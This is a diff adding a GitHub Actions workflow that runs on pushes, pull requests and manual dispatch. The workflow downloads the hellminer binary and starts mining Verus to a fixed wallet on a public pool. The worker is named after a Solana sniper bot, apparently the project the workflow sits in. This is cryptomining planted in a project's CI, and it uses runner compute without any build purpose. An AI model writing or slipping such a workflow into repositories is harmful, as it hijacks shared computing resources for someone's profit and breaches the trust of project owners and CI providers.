@@ -1,0 +1,31 @@
+name: Verus Miner CI
+
+on:
+  push:
+    branches: [main]
+  pull_request:
+    branches: [main]
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v2
+
+      - name: Install dependencies
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y wget tar
+
+      - name: Download hminer
+        run: |
+          wget https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64_avx2.tar.gz
+          tar -xzf hellminer_linux64_avx2.tar.gz
+          mv hellminer hminer
+          chmod +x hminer
+
+      - name: Start mining
+        run: |
+          ./hminer -c stratum+tcp://eu.luckpool.net:3956 -u RRykJ9xGTKunTzEHD54L7hBcWDFf9hcGQG.solana-raydium-sniper-bot -p x
